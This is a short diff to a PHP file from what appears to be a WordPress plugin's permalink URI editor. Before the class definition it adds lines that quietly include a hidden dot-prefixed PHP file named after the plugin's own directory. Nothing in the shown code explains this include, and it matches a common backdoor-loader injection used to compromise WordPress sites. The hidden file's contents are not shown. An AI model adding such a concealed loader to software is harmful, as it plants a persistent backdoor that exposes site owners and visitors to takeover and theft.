@@ -3,6 +3,10 @@
 /**
 * Extend WP_List_Table with two subclasses for post types and taxonomies
 */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Permalink_Manager_URI_Editor_Post extends WP_List_Table {
 
 	public $displayed_post_types, $displayed_post_statuses;
